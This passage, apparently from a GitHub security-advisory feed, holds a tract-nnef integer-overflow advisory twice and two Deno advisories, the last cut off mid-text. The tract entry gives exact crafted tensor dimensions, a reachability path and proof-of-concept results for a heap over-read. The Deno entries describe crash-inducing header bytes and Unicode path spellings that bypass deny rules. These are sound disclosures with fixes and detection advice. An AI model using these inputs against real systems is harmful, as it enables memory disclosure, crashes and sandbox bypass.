<li><strong>Class:</strong> CWE-190 (integer overflow) → CWE-125 (out-of-bounds read)</li>
<li><strong>Trigger:</strong> loading a crafted NNEF model archive (<code>*.nnef.tgz</code> / <code>*.nnef.tar</code> / dir) via the public <code>tract_nnef::nnef().model_for_path</code> / <code>model_for_read</code></li>
<li><strong>Impact:</strong> <code>read_tensor</code> returns a memory-unsafe tensor (reported <code>len</code> 2^61 over a 56-byte heap allocation). Always-on primitive: a <strong>bounded heap out-of-bounds read</strong> during model build (<code>as_uniform</code>), an adjacent-heap information-disclosure reachable via the public load API. The resulting slice is an unsound <code>from_raw_parts(ptr, 2^61)</code> that <strong>SIGSEGVs (DoS)</strong> on any access past the mapped region (demonstrated by direct access). No out-of-bounds write and no RCE were achieved — tract's const-folding/<code>as_uniform</code> fast-paths fold simple consuming graphs without the full read.</li>
<li><strong>Severity:</strong> Medium</li>
</ul>
<h2 id="summary">Summary</h2>
<p><code>read_tensor</code> builds a tensor <code>shape</code> from attacker-controlled 32-bit dimensions and computes the element count <code>len = product(shape)</code> and the byte allocation <code>product(shape) * size_of(dt)</code> with <strong>unchecked <code>usize</code> arithmetic</strong>. In <code>--release</code> (no <code>overflow-checks</code>), both products wrap modulo 2^64. An attacker chooses dimensions so that the wrapped products collapse to a small value that satisfies the header consistency check, while the <em>true</em> element count remains astronomically large. <code>read_tensor</code> returns <code>Ok</code> with a <code>Tensor</code> whose reported <code>len</code> (e.g. 2^61+7) is far larger than its backing heap allocation (e.g. 56 bytes). The unchecked slice accessor <code>as_slice_unchecked</code> (<code>from_raw_parts(ptr, self.len)</code>) then produces a slice spanning ~18 exabytes over a 56-byte buffer. The out-of-bounds read fires automatically during model build (no inference required), reachable through the default <code>DatLoader</code> resource loader.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>nnef/src/tensors.rs</code>, <code>read_tensor</code>:</p>
<pre><code>let shape: TVec&lt;usize&gt; = header.dims[0..header.rank as usize].iter().map(|d| *d as _).collect();
let len = shape.iter().product::&lt;usize&gt;();                       // (1) unchecked, wraps
...
} else if header.bits_per_item != u32::MAX
    &amp;&amp; len * (header.bits_per_item as usize / 8) != header.data_size_bytes as usize  // (2) wrapped == u32
{
    bail!(...);
}
...
let mut tensor = unsafe { Tensor::uninitialized_dt(dt, &amp;shape)? };   // (3) alloc off the same wrapped product
...
reader.read_exact(plain.as_bytes_mut())?;                            // storage-bounded read, no overflow here
Ok(tensor)
</code></pre>
<p><code>data/src/tensor.rs</code>, <code>uninitialized_aligned_dt</code>:</p>
<pre><code>let bytes = shape.iter().cloned().product::&lt;usize&gt;() * dt.size_of();  // (3) wraps to the same small value
let storage = ... Blob::new_for_size_and_align(bytes, alignment) ...;
...
tensor.update_strides_and_len();                                     // len = product(shape), wraps, no clamp
</code></pre>
<p>The three quantities — the consistency-check LHS <code>(2)</code>, the allocation <code>(3)</code>, and the reported <code>len</code> — are all the same wrapped <code>product(shape)*size_of</code>, so they stay mutually consistent and <strong>the consistency check at <code>(2)</code> cannot catch the overflow</strong>. <code>data_size_bytes</code> is a <code>u32</code>, so the attacker simply sets it to the wrapped value.</p>
<p>Corruption sink — <code>data/src/tensor.rs::as_slice_unchecked</code> (and <code>data/src/tensor/plain_view.rs::as_slice_unchecked</code>):</p>
<pre><code>if self.storage.byte_len() == 0 { &amp;[] }
else { std::slice::from_raw_parts(self.as_ptr_unchecked(), self.len()) }  // len = 2^61 over a 56-byte alloc
</code></pre>
<p>The only guard is <code>byte_len() == 0</code>. A small <strong>non-zero</strong> allocation defeats it and yields an unsound oversized slice.</p>
<h2 id="witness-f64">Witness (F64)</h2>
<pre><code>dims          = [33955849, 7005787, 359, 3, 3, 3]   (rank 6, each &lt;= u32::MAX)
product(shape)= 2_305_843_009_213_693_959 = 2^61 + 7
bits_per_item = 64 (F64), item_type = 0, item_type_vendor = 0
data_size_bytes = 56            # == (2^61+7)*8 mod 2^64
</code></pre>
<ul>
<li><code>len * (bits/8) mod 2^64 = (2^61+7)*8 mod 2^64 = 56 == data_size_bytes</code> → consistency check passes.</li>
<li>allocation = <code>(2^61+7)*8 mod 2^64 = 56</code> bytes (7 × F64).</li>
<li>reported <code>len</code> = <code>2^61+7</code> elements.</li>
</ul>
<p>Only the <code>is_copy()</code> numeric arms (F16/F32/F64/int, and likely the <code>complex</code> arms) are exploitable. F64 is the cleanest (<code>bits/8</code> divides evenly). The <code>bool</code>, <code>String</code>, and block-quant paths are each guarded by an independent mechanism (size_of==1 prevents byte/element divergence; <code>String</code> bails on a missing <code>num_traits::Zero</code> impl; block-quant has its own <code>ensure!(expected_len == data_size_bytes)</code> and uses non-plain <code>Exotic</code> storage).</p>
<h2 id="reachability-load-time-public-api">Reachability (load-time, public API)</h2>
<pre><code>nnef().model_for_read(tar)
  -&gt; proto_model_for_read                       nnef/src/framework.rs:303
    -&gt; DatLoader.try_load (any *.dat)            nnef/src/resource.rs:97   (default loader, framework.rs:33)
      -&gt; read_tensor -&gt; Ok(Tensor{len=2^61+7, storage=56B})   nnef/src/tensors.rs:61
  -&gt; into_typed_model -&gt; variable() fragment     nnef/src/ops/nnef/deser.rs:74
       ensure!(tensor.shape() == &amp;*shape)        deser.rs:122  (attacker matches shape in graph.nnef -&gt; passes)
    -&gt; Const::new -&gt; wire_node                   core/src/model/typed.rs:67
      -&gt; Const::output_facts                     core/src/ops/konst.rs:54
        -&gt; TypedFact::try_from                   core/src/model/fact.rs:459
          -&gt; Tensor::as_uniform -&gt; is_uniform_t::&lt;f64&gt;   data/src/tensor.rs:1099
            -&gt; as_slice_unchecked::&lt;f64&gt;         data/src/tensor.rs:1044
              -&gt; from_raw_parts(ptr, 2^61+7) over 56-byte buffer -&gt; OOB READ
</code></pre>
<p>No shape-vs-storage re-validation exists anywhere on this path (<code>proto.validate()</code> checks only the AST; <code>Const::new</code> checks only <code>is_plain</code>; <code>check_for_access</code> checks only the datum type; even the <em>safe</em> <code>PlainView::as_slice</code> does <code>from_raw_parts(ptr, self.len)</code> with no length guard).</p>
<h2 id="execution-proof-of-concept">Execution (proof of concept)</h2>
<p>Reproduced against the crate at the affected revision, <code>--release</code>, x86_64-linux. Three scenarios:</p>
<ol>
<li><strong>Direct <code>read_tensor</code></strong> — feed the crafted 128-byte header + 56-byte payload:<ul>
<li><code>read_tensor -&gt; Ok</code>, <code>shape=[33955849,7005787,359,3,3,3]</code>, <code>len()=2305843009213693959</code>, <code>as_bytes().len()=56</code>, <code>as_slice::&lt;f64&gt;().len()=2305843009213693959</code>.</li>
<li><code>s[7]</code> (first element past the 56-byte allocation) returns <code>0x0000000000000041</code> → <strong>heap OOB read</strong> (adjacent-heap disclosure).</li>
<li><code>s[1&lt;&lt;40]</code> → <strong>SIGSEGV</strong> (signal 11).</li>
</ul>
</li>
<li><strong>Public load API</strong> — build a malicious <code>.nnef.tar</code> (<code>graph.nnef</code> with <code>variable(label='weights', shape=[...])</code> + <code>weights.dat</code>) and call <code>nnef().model_for_read()</code>:<ul>
<li>returns <code>Ok</code> with one <code>Const</code> node, <code>out[0].fact.uniform=Some(...)</code>, <code>len()=2305843009213693959</code> over a 56-byte buffer → confirms <code>as_uniform</code>/<code>is_uniform_t</code>/<code>as_slice_unchecked</code> performed an <strong>OOB read on load</strong> (bounded over-read here because <code>is_uniform</code>'s <code>.all()</code> short-circuits on the uniform <code>0x41</code> payload).</li>
</ul>
</li>
<li><strong>Optimized graph</strong> — same archive but the const is consumed (<code>output = mul(weights, weights)</code>), then <code>into_optimized</code> / <code>run</code>:<ul>
<li><strong>Does not crash.</strong> With both a uniform (<code>0x41×56</code>) and a non-uniform (<code>0..56</code>) payload, <code>into_optimized</code> const-folds <code>mul(const, const)</code> to a single node <strong>without a full-length materialization</strong> of the oversized const, and <code>run</code> completes. A reliable arbitrary-length crash through a <em>normal optimized graph</em> was therefore NOT demonstrated; the always-on primitive is the bounded load-time over-read (scenario 2), and the wild-slice SIGSEGV is shown via direct access (scenario 1).</li>
</ul>
</li>
</ol>
<p>Runnable PoC sources are available to the maintainers on request.</p>
<h2 id="detection">Detection</h2>
<ul>
<li><strong>Static:</strong> flag <code>*.iter().product::&lt;usize&gt;()</code> over externally-controlled dimensions without <code>checked_*</code>/<code>try_into</code>, especially when the result feeds an allocation and a separately-tracked <code>len</code>.</li>
<li><strong>Runtime / fleet:</strong> crash telemetry showing SIGSEGV inside <code>is_uniform_t</code> / <code>from_raw_parts</code> during NNEF model load; an ASAN build flags <code>heap-buffer-overflow READ</code> in <code>read_tensor</code>→<code>as_uniform</code>.</li>
<li><strong>Input filter (compensating):</strong> reject NNEF <code>.dat</code> tensors where <code>product(dims)</code> overflows <code>u64</code>, or where <code>product(dims) * size_of(dt) != data_size_bytes</code> computed in <strong>checked</strong> arithmetic, before constructing the tensor.</li>
<li><strong>YARA-ish heuristic for <code>.dat</code> blobs:</strong> NNEF magic <code>4E EF 01 00</code>, <code>rank&lt;=8</code>, and any <code>dim &gt;= 0x10000</code> whose checked product with the others overflows.</li>
</ul>
<h2 id="mitigation-suggested-fix">Mitigation (suggested fix)</h2>
<p>In <code>read_tensor</code>, compute the element count and byte size with checked arithmetic and reject on overflow, mirroring the guard already present on the block-quant path (<code>ensure!(expected_len == data_size_bytes)</code> added in <code>eacd13ccb</code>):</p>
<pre><code>let len = shape.iter().try_fold(1usize, |a, &amp;d| a.checked_mul(d))
    .context("tensor shape product overflows usize")?;
let byte_size = len.checked_mul(dt.size_of())
    .context("tensor byte size overflows usize")?;
ensure!(byte_size == header.data_size_bytes as usize, "shape/len vs data_size_bytes mismatch");
</code></pre>
<p>Defense in depth: make <code>Tensor::uninitialized_aligned_dt</code> reject when <code>product(shape)*size_of</code> overflows, and add a <code>len * size_of == storage.byte_len()</code> invariant check in the <code>as_slice*</code> accessors (or at <code>Tensor</code> construction) so a <code>len</code>/storage mismatch can never reach <code>from_raw_parts</code>.</p>
<p>Mapping: CWE-190, CWE-125; mitigations align with input validation (OWASP ASVS V5) and safe integer handling (CERT INT32-C analogue).</p>
<h2 id="prior-art--why-this-is-not-already-fixed">Prior art / why this is not already fixed</h2>
<ul>
<li><code>eacd13ccb</code> (2026-03-23, "Add blob-size validation to BlockQuantStorage constructors") added overflow/blob-size validation <strong>only to the block-quant path</strong>; the dense <code>DatLoader</code>/<code>read_tensor</code> path was left unguarded. The maintainers fixed the sibling and missed this one.</li>
<li>PR #745 ("Fix UB by creating uninit Tensors with a non-null pointer") is a <em>different</em> UB (null base pointer on zero-length slices) in the same module family.</li>
<li>No CVE / RustSec / GHSA / OSV / Huntr entry matches this bug; last change to <code>nnef/src/tensors.rs</code> predates HEAD and added no overflow guard to the dense path.</li>
</ul>
<hr>
<p>Reported by: s1ko (<a href="mailto:s1ko@riseup.net">s1ko@riseup.net</a> · github.com/s1ko)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-x5mv-8wgw-29hg">https://github.com/sonos/tract/security/advisories/GHSA-x5mv-8wgw-29hg</a></li>
<li><a href="https://github.com/advisories/GHSA-x5mv-8wgw-29hg">https://github.com/advisories/GHSA-x5mv-8wgw-29hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5mv-8wgw-29hg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-18T15:05:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tract-nnef] tract-nnef: integer overflow in NNEF `.dat` tensor parser yields an out-of-bounds read on model load]]></title>
        <id>https://github.com/advisories/GHSA-x5mv-8wgw-29hg</id>
        <link href="https://github.com/advisories/GHSA-x5mv-8wgw-29hg"/>
        <updated>2026-06-18T15:05:24.000Z</updated>
        <content type="html"><![CDATA[<ul>
<li><strong>Component:</strong> <code>tract-nnef</code> (<code>nnef/src/tensors.rs::read_tensor</code>) + <code>tract-data</code> (<code>data/src/tensor.rs</code>)</li>
<li><strong>Affected versions:</strong> <code>&lt; 0.21.16</code>, <code>0.22.0</code>–<code>0.22.2</code>, <code>0.23.0</code>–<code>0.23.1</code> — the dense <code>DatLoader</code> path was unguarded across all three release lines; patched in 0.21.16 / 0.22.2 / 0.23.1</li>
<li><strong>Class:</strong> CWE-190 (integer overflow) → CWE-125 (out-of-bounds read)</li>
<li><strong>Trigger:</strong> loading a crafted NNEF model archive (<code>*.nnef.tgz</code> / <code>*.nnef.tar</code> / dir) via the public <code>tract_nnef::nnef().model_for_path</code> / <code>model_for_read</code></li>
<li><strong>Impact:</strong> <code>read_tensor</code> returns a memory-unsafe tensor (reported <code>len</code> 2^61 over a 56-byte heap allocation). Always-on primitive: a <strong>bounded heap out-of-bounds read</strong> during model build (<code>as_uniform</code>), an adjacent-heap information-disclosure reachable via the public load API. The resulting slice is an unsound <code>from_raw_parts(ptr, 2^61)</code> that <strong>SIGSEGVs (DoS)</strong> on any access past the mapped region (demonstrated by direct access). No out-of-bounds write and no RCE were achieved — tract's const-folding/<code>as_uniform</code> fast-paths fold simple consuming graphs without the full read.</li>
<li><strong>Severity:</strong> Medium</li>
</ul>
<h2 id="summary">Summary</h2>
<p><code>read_tensor</code> builds a tensor <code>shape</code> from attacker-controlled 32-bit dimensions and computes the element count <code>len = product(shape)</code> and the byte allocation <code>product(shape) * size_of(dt)</code> with <strong>unchecked <code>usize</code> arithmetic</strong>. In <code>--release</code> (no <code>overflow-checks</code>), both products wrap modulo 2^64. An attacker chooses dimensions so that the wrapped products collapse to a small value that satisfies the header consistency check, while the <em>true</em> element count remains astronomically large. <code>read_tensor</code> returns <code>Ok</code> with a <code>Tensor</code> whose reported <code>len</code> (e.g. 2^61+7) is far larger than its backing heap allocation (e.g. 56 bytes). The unchecked slice accessor <code>as_slice_unchecked</code> (<code>from_raw_parts(ptr, self.len)</code>) then produces a slice spanning ~18 exabytes over a 56-byte buffer. The out-of-bounds read fires automatically during model build (no inference required), reachable through the default <code>DatLoader</code> resource loader.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>nnef/src/tensors.rs</code>, <code>read_tensor</code>:</p>
<pre><code>let shape: TVec&lt;usize&gt; = header.dims[0..header.rank as usize].iter().map(|d| *d as _).collect();
let len = shape.iter().product::&lt;usize&gt;();                       // (1) unchecked, wraps
...
} else if header.bits_per_item != u32::MAX
    &amp;&amp; len * (header.bits_per_item as usize / 8) != header.data_size_bytes as usize  // (2) wrapped == u32
{
    bail!(...);
}
...
let mut tensor = unsafe { Tensor::uninitialized_dt(dt, &amp;shape)? };   // (3) alloc off the same wrapped product
...
reader.read_exact(plain.as_bytes_mut())?;                            // storage-bounded read, no overflow here
Ok(tensor)
</code></pre>
<p><code>data/src/tensor.rs</code>, <code>uninitialized_aligned_dt</code>:</p>
<pre><code>let bytes = shape.iter().cloned().product::&lt;usize&gt;() * dt.size_of();  // (3) wraps to the same small value
let storage = ... Blob::new_for_size_and_align(bytes, alignment) ...;
...
tensor.update_strides_and_len();                                     // len = product(shape), wraps, no clamp
</code></pre>
<p>The three quantities — the consistency-check LHS <code>(2)</code>, the allocation <code>(3)</code>, and the reported <code>len</code> — are all the same wrapped <code>product(shape)*size_of</code>, so they stay mutually consistent and <strong>the consistency check at <code>(2)</code> cannot catch the overflow</strong>. <code>data_size_bytes</code> is a <code>u32</code>, so the attacker simply sets it to the wrapped value.</p>
<p>Corruption sink — <code>data/src/tensor.rs::as_slice_unchecked</code> (and <code>data/src/tensor/plain_view.rs::as_slice_unchecked</code>):</p>
<pre><code>if self.storage.byte_len() == 0 { &amp;[] }
else { std::slice::from_raw_parts(self.as_ptr_unchecked(), self.len()) }  // len = 2^61 over a 56-byte alloc
</code></pre>
<p>The only guard is <code>byte_len() == 0</code>. A small <strong>non-zero</strong> allocation defeats it and yields an unsound oversized slice.</p>
<h2 id="witness-f64">Witness (F64)</h2>
<pre><code>dims          = [33955849, 7005787, 359, 3, 3, 3]   (rank 6, each &lt;= u32::MAX)
product(shape)= 2_305_843_009_213_693_959 = 2^61 + 7
bits_per_item = 64 (F64), item_type = 0, item_type_vendor = 0
data_size_bytes = 56            # == (2^61+7)*8 mod 2^64
</code></pre>
<ul>
<li><code>len * (bits/8) mod 2^64 = (2^61+7)*8 mod 2^64 = 56 == data_size_bytes</code> → consistency check passes.</li>
<li>allocation = <code>(2^61+7)*8 mod 2^64 = 56</code> bytes (7 × F64).</li>
<li>reported <code>len</code> = <code>2^61+7</code> elements.</li>
</ul>
<p>Only the <code>is_copy()</code> numeric arms (F16/F32/F64/int, and likely the <code>complex</code> arms) are exploitable. F64 is the cleanest (<code>bits/8</code> divides evenly). The <code>bool</code>, <code>String</code>, and block-quant paths are each guarded by an independent mechanism (size_of==1 prevents byte/element divergence; <code>String</code> bails on a missing <code>num_traits::Zero</code> impl; block-quant has its own <code>ensure!(expected_len == data_size_bytes)</code> and uses non-plain <code>Exotic</code> storage).</p>
<h2 id="reachability-load-time-public-api">Reachability (load-time, public API)</h2>
<pre><code>nnef().model_for_read(tar)
  -&gt; proto_model_for_read                       nnef/src/framework.rs:303
    -&gt; DatLoader.try_load (any *.dat)            nnef/src/resource.rs:97   (default loader, framework.rs:33)
      -&gt; read_tensor -&gt; Ok(Tensor{len=2^61+7, storage=56B})   nnef/src/tensors.rs:61
  -&gt; into_typed_model -&gt; variable() fragment     nnef/src/ops/nnef/deser.rs:74
       ensure!(tensor.shape() == &amp;*shape)        deser.rs:122  (attacker matches shape in graph.nnef -&gt; passes)
    -&gt; Const::new -&gt; wire_node                   core/src/model/typed.rs:67
      -&gt; Const::output_facts                     core/src/ops/konst.rs:54
        -&gt; TypedFact::try_from                   core/src/model/fact.rs:459
          -&gt; Tensor::as_uniform -&gt; is_uniform_t::&lt;f64&gt;   data/src/tensor.rs:1099
            -&gt; as_slice_unchecked::&lt;f64&gt;         data/src/tensor.rs:1044
              -&gt; from_raw_parts(ptr, 2^61+7) over 56-byte buffer -&gt; OOB READ
</code></pre>
<p>No shape-vs-storage re-validation exists anywhere on this path (<code>proto.validate()</code> checks only the AST; <code>Const::new</code> checks only <code>is_plain</code>; <code>check_for_access</code> checks only the datum type; even the <em>safe</em> <code>PlainView::as_slice</code> does <code>from_raw_parts(ptr, self.len)</code> with no length guard).</p>
<h2 id="execution-proof-of-concept">Execution (proof of concept)</h2>
<p>Reproduced against the crate at the affected revision, <code>--release</code>, x86_64-linux. Three scenarios:</p>
<ol>
<li><strong>Direct <code>read_tensor</code></strong> — feed the crafted 128-byte header + 56-byte payload:<ul>
<li><code>read_tensor -&gt; Ok</code>, <code>shape=[33955849,7005787,359,3,3,3]</code>, <code>len()=2305843009213693959</code>, <code>as_bytes().len()=56</code>, <code>as_slice::&lt;f64&gt;().len()=2305843009213693959</code>.</li>
<li><code>s[7]</code> (first element past the 56-byte allocation) returns <code>0x0000000000000041</code> → <strong>heap OOB read</strong> (adjacent-heap disclosure).</li>
<li><code>s[1&lt;&lt;40]</code> → <strong>SIGSEGV</strong> (signal 11).</li>
</ul>
</li>
<li><strong>Public load API</strong> — build a malicious <code>.nnef.tar</code> (<code>graph.nnef</code> with <code>variable(label='weights', shape=[...])</code> + <code>weights.dat</code>) and call <code>nnef().model_for_read()</code>:<ul>
<li>returns <code>Ok</code> with one <code>Const</code> node, <code>out[0].fact.uniform=Some(...)</code>, <code>len()=2305843009213693959</code> over a 56-byte buffer → confirms <code>as_uniform</code>/<code>is_uniform_t</code>/<code>as_slice_unchecked</code> performed an <strong>OOB read on load</strong> (bounded over-read here because <code>is_uniform</code>'s <code>.all()</code> short-circuits on the uniform <code>0x41</code> payload).</li>
</ul>
</li>
<li><strong>Optimized graph</strong> — same archive but the const is consumed (<code>output = mul(weights, weights)</code>), then <code>into_optimized</code> / <code>run</code>:<ul>
<li><strong>Does not crash.</strong> With both a uniform (<code>0x41×56</code>) and a non-uniform (<code>0..56</code>) payload, <code>into_optimized</code> const-folds <code>mul(const, const)</code> to a single node <strong>without a full-length materialization</strong> of the oversized const, and <code>run</code> completes. A reliable arbitrary-length crash through a <em>normal optimized graph</em> was therefore NOT demonstrated; the always-on primitive is the bounded load-time over-read (scenario 2), and the wild-slice SIGSEGV is shown via direct access (scenario 1).</li>
</ul>
</li>
</ol>
<p>Runnable PoC sources are available to the maintainers on request.</p>
<h2 id="detection">Detection</h2>
<ul>
<li><strong>Static:</strong> flag <code>*.iter().product::&lt;usize&gt;()</code> over externally-controlled dimensions without <code>checked_*</code>/<code>try_into</code>, especially when the result feeds an allocation and a separately-tracked <code>len</code>.</li>
<li><strong>Runtime / fleet:</strong> crash telemetry showing SIGSEGV inside <code>is_uniform_t</code> / <code>from_raw_parts</code> during NNEF model load; an ASAN build flags <code>heap-buffer-overflow READ</code> in <code>read_tensor</code>→<code>as_uniform</code>.</li>
<li><strong>Input filter (compensating):</strong> reject NNEF <code>.dat</code> tensors where <code>product(dims)</code> overflows <code>u64</code>, or where <code>product(dims) * size_of(dt) != data_size_bytes</code> computed in <strong>checked</strong> arithmetic, before constructing the tensor.</li>
<li><strong>YARA-ish heuristic for <code>.dat</code> blobs:</strong> NNEF magic <code>4E EF 01 00</code>, <code>rank&lt;=8</code>, and any <code>dim &gt;= 0x10000</code> whose checked product with the others overflows.</li>
</ul>
<h2 id="mitigation-suggested-fix">Mitigation (suggested fix)</h2>
<p>In <code>read_tensor</code>, compute the element count and byte size with checked arithmetic and reject on overflow, mirroring the guard already present on the block-quant path (<code>ensure!(expected_len == data_size_bytes)</code> added in <code>eacd13ccb</code>):</p>
<pre><code>let len = shape.iter().try_fold(1usize, |a, &amp;d| a.checked_mul(d))
    .context("tensor shape product overflows usize")?;
let byte_size = len.checked_mul(dt.size_of())
    .context("tensor byte size overflows usize")?;
ensure!(byte_size == header.data_size_bytes as usize, "shape/len vs data_size_bytes mismatch");
</code></pre>
<p>Defense in depth: make <code>Tensor::uninitialized_aligned_dt</code> reject when <code>product(shape)*size_of</code> overflows, and add a <code>len * size_of == storage.byte_len()</code> invariant check in the <code>as_slice*</code> accessors (or at <code>Tensor</code> construction) so a <code>len</code>/storage mismatch can never reach <code>from_raw_parts</code>.</p>
<p>Mapping: CWE-190, CWE-125; mitigations align with input validation (OWASP ASVS V5) and safe integer handling (CERT INT32-C analogue).</p>
<h2 id="prior-art--why-this-is-not-already-fixed">Prior art / why this is not already fixed</h2>
<ul>
<li><code>eacd13ccb</code> (2026-03-23, "Add blob-size validation to BlockQuantStorage constructors") added overflow/blob-size validation <strong>only to the block-quant path</strong>; the dense <code>DatLoader</code>/<code>read_tensor</code> path was left unguarded. The maintainers fixed the sibling and missed this one.</li>
<li>PR #745 ("Fix UB by creating uninit Tensors with a non-null pointer") is a <em>different</em> UB (null base pointer on zero-length slices) in the same module family.</li>
<li>No CVE / RustSec / GHSA / OSV / Huntr entry matches this bug; last change to <code>nnef/src/tensors.rs</code> predates HEAD and added no overflow guard to the dense path.</li>
</ul>
<hr>
<p>Reported by: s1ko (<a href="mailto:s1ko@riseup.net">s1ko@riseup.net</a> · github.com/s1ko)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-x5mv-8wgw-29hg">https://github.com/sonos/tract/security/advisories/GHSA-x5mv-8wgw-29hg</a></li>
<li><a href="https://github.com/advisories/GHSA-x5mv-8wgw-29hg">https://github.com/advisories/GHSA-x5mv-8wgw-29hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5mv-8wgw-29hg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-18T15:05:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno: Denial of service via non-ASCII bytes in WebSocket response headers]]></title>
        <id>https://github.com/advisories/GHSA-x2qc-cmh9-f4hf</id>
        <link href="https://github.com/advisories/GHSA-x2qc-cmh9-f4hf"/>
        <updated>2026-06-17T18:48:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A Deno program that opens a client <code>WebSocket</code> connection could be crashed by
the remote server. While handling the WebSocket handshake response, Deno parsed
the <code>Sec-WebSocket-Protocol</code> and <code>Sec-WebSocket-Extensions</code> response headers in
a way that assumed their bytes were always printable ASCII. A response header
containing non-visible-ASCII bytes (<code>0x80</code>-<code>0xFF</code>) caused a panic that aborted
the entire Deno process.</p>
<h2 id="details">Details</h2>
<p>When establishing a client WebSocket connection, Deno read the
<code>Sec-WebSocket-Protocol</code> and <code>Sec-WebSocket-Extensions</code> headers from the
server's <code>101 Switching Protocols</code> response and converted them to strings
without handling the failure case. <code>HeaderValue::to_str()</code> returns an error for
any value containing bytes outside the visible-ASCII range, so a header carrying
such bytes triggered an unrecoverable error during conversion.</p>
<p>Because the client initiates the outbound connection, the handshake response is
fully controlled by the server. A server that returns bytes such as <code>0xFF 0xFE</code>
in either header could therefore crash any client that connected to it.</p>
<p>This is purely an availability issue. There is no information disclosure and no
memory-safety impact; the only effect is termination of the current process.</p>
<h2 id="impact">Impact</h2>
<p>Remote denial of service. Any Deno application that establishes WebSocket
connections to untrusted or potentially-compromised endpoints could be
terminated by the remote peer. Exploitation requires the victim application to
initiate the outbound WebSocket connection. An attacker who controls the
WebSocket endpoint, or who can man-in-the-middle a plaintext <code>ws://</code> connection,
could trigger the crash. The effect is confined to crashing the process that
opened the connection.</p>
<h2 id="patch">Patch</h2>
<p>The issue is fixed in Deno <code>2.7.5</code>. The header values are now parsed with
graceful fallbacks: values that cannot be represented as ASCII strings are
skipped instead of aborting the process. A regression test covers a server that
returns non-ASCII bytes in <code>Sec-WebSocket-Protocol</code>.</p>
<p>Users should upgrade to Deno <code>2.7.5</code> or later.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Until you can upgrade, only connect to trusted WebSocket endpoints and prefer
<code>wss://</code> (TLS) over <code>ws://</code>, which prevents a network man-in-the-middle from
injecting malicious header bytes into the handshake response.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-x2qc-cmh9-f4hf">https://github.com/denoland/deno/security/advisories/GHSA-x2qc-cmh9-f4hf</a></li>
<li><a href="https://github.com/advisories/GHSA-x2qc-cmh9-f4hf">https://github.com/advisories/GHSA-x2qc-cmh9-f4hf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x2qc-cmh9-f4hf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-17T18:48:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno: Permission Bypass via Unicode Normalization Mismatch on macOS (APFS)]]></title>
        <id>https://github.com/advisories/GHSA-8xpq-cjcf-3wh9</id>
        <link href="https://github.com/advisories/GHSA-8xpq-cjcf-3wh9"/>
        <updated>2026-06-16T19:11:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Deno's permission system enforces filesystem and execution restrictions by
comparing the requested path against the path supplied to <code>--deny-read</code>,
<code>--deny-write</code>, <code>--deny-run</code>, or <code>--deny-ffi</code>. On macOS, that comparison was
done at the raw-byte level while the APFS filesystem treats different Unicode
spellings of the same name as the same file.</p>
<p>That means a program could reach a denied path by spelling it differently than
the deny rule. For example, with <code>--deny-read=/secrets/passwörter.txt</code>, a
script could still read the file by opening <code>/secrets/passwo\u0308rter.txt</code>
(NFD instead of NFC), or <code>/SECRETS/PASSWÖRTER.txt</code> (different case, since
default APFS volumes are case-insensitive). Other forms include ligature
characters (<code>ﬁ</code> vs <code>fi</code>, <code>ﬀ</code> vs <code>ff</code>, …) and German <code>ß</code> vs <code>ss</code>.</p>
<p>The denied path and the requested path differed at the byte level, so Deno's
permission check passed; the kernel then resolved them to the same inode and
served the file anyway. The same flaw affected <code>--deny-write</code>, <code>--deny-run</code>,
and <code>--deny-ffi</code>, which share the same path-comparison code.</p>
<h2 id="am-i-affected">Am I affected?</h2>
<p>You are potentially affected if <strong>all</strong> of the following are true:</p>
<ol>
<li>You run Deno on <strong>macOS</strong> (the issue is specific to APFS path-equivalence
rules; Linux and Windows are not affected by this variant).</li>
<li>You rely on <code>--deny-read</code>, <code>--deny-write</code>, <code>--deny-run</code>, or <code>--deny-ffi</code>
as a security boundary against less-trusted code — a dependency, plugin,
or attacker-controlled input.</li>
<li>The protected path contains characters that have alternate Unicode
spellings — most commonly accented characters (<code>é</code>, <code>ñ</code>, <code>ö</code>, …), German
<code>ß</code>, or Latin ligatures — or you rely on case-sensitivity on a default
APFS volume.</li>
</ol>
<p>If you only run fully trusted code, or your deny rules cover paths that are
pure ASCII with no case-sensitive aliases, you are not exposed to this
specific bypass.</p>
<h2 id="impact">Impact</h2>
<p>A program running with broad <code>--allow-read</code> (or <code>--allow-write</code> /
<code>--allow-run</code> / <code>--allow-ffi</code>) but with <code>--deny-*</code> carve-outs for specific
paths could read, write, execute, or load via FFI those denied paths by
referring to them through a Unicode- or case-equivalent spelling. The sandbox
model on macOS was weaker than the flags suggested.</p>
<h2 id="workaround">Workaround</h2>
<p>If you cannot upgrade immediately:</p>
<ul>
<li>Prefer <code>--allow-*</code> allowlists over <code>--deny-*</code> denylists. Allow rules match
 against the original specifier, so an attacker-supplied alternate spelling
 will not match a path you didn't explicitly grant.</li>
<li>Do not rely on case-sensitivity of paths on macOS for security boundaries;
 default APFS volumes are case-insensitive.</li>
</ul>
<h2 id="fix">Fix</h2>
<p>On macOS, Deno now normalizes both the deny-rule path and the requested path
to NFC and applies Unicode case folding before comparing them. This matches
how APFS resolves paths at the inode level, so byte-different but equivalent
spellings are now rejected by the same deny rule.</p>
